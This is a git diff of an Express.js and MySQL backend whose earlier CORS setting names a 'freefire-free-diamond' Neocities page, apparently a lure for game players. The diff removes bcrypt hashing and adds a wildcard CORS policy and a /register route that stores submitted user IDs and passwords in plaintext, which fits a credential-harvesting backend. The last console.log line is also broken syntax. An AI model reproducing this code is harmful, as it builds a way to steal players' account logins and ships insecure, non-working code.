@@ -1,79 +1,54 @@
-// Import packages
 const express = require('express');
 const cors = require('cors');
-app.use(cors({
-  orgin:"https://freefire-free-diamond.neocities.org",
-  method:['GET','POST'],
-  credentials:true
-}));
 const mysql = require('mysql2');
-const bcrypt = require('bcryptjs');
+require('dotenv').config();
 
-// Initialize express
-const app = express();
+const app = express(); // ✅ Define app FIRST
 
-// Middleware
-app.use(cors()); // Allow frontend (Neocities) access
-app.use(express.json()); // Parse JSON body
+app.use(cors({
+  origin: '*',
+  methods: ['GET', 'POST'],
+  allowedHeaders: ['Content-Type']
+}));
 
-// Database connection
-const db = mysql.createConnection({
+app.use(express.json());
+
+// ✅ Database connection
+const connection = mysql.createConnection({
   host: process.env.DB_HOST,
   user: process.env.DB_USER,
   password: process.env.DB_PASS,
   database: process.env.DB_NAME,
   port: process.env.DB_PORT || 3306,
-  ssl: { rejectUnauthorized: false } // Required for Render + Cloud MySQL
+  ssl: {
+    rejectUnauthorized: false
+  }
 });
 
-db.connect(err => {
+connection.connect(err => {
   if (err) {
     console.error('❌ Database connection failed:', err);
   } else {
-    console.log('✅ Connected to MySQL Database');
+    console.log('✅ Connected to MySQL database');
   }
 });
 
-// Default route to test if backend is live
-app.get('/', (req, res) => {
-  res.send('✅ Backend is live and running on Render!');
+// ✅ Example API route
+app.post('/register', (req, res) => {
+  const { userid, password } = req.body;
+  const sql = 'INSERT INTO users (userid, password) VALUES (?, ?)';
+  connection.query(sql, [userid, password], (err) => {
+    if (err) {
+      console.error(err);
+      res.status(500).send('Database error');
+    } else {
+      res.send('Successfully submitted!');
+    }
+  });
 });
 
-// Register route
-app.post('/register', async (req, res) => {
-  const { email, password } = req.body;
-
-  // Validate input
-  if (!email || !password) {
-    return res.status(400).send('Email and password are required');
-  }
-
-  try {
-    // Hash password
-    const hashed = await bcrypt.hash(password, 10);
-
-    // Insert into database
-    const sql = 'INSERT INTO users (email, password) VALUES (?, ?)';
-    db.query(sql, [email, hashed], (err, result) => {
-      if (err) {
-        console.error(err);
-
-        // Handle duplicate email
-        if (err.code === 'ER_DUP_ENTRY') {
-          return res.status(409).send('Email already registered');
-        }
-
-        return res.status(500).send('Error saving user');
-      }
-
-      return res.send('✅ Successfully Registered');
-    });
-  } catch (err) {
-    console.error(err);
-    res.status(500).send('Server error');
-  }
-});
-
-// Dynamic port for Render
+// ✅ Start server
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log('🚀 Server running on port ${PORT}'));
+app.listen(PORT, () => {
+  console.log(🚀 Server running on port ${PORT});
+});
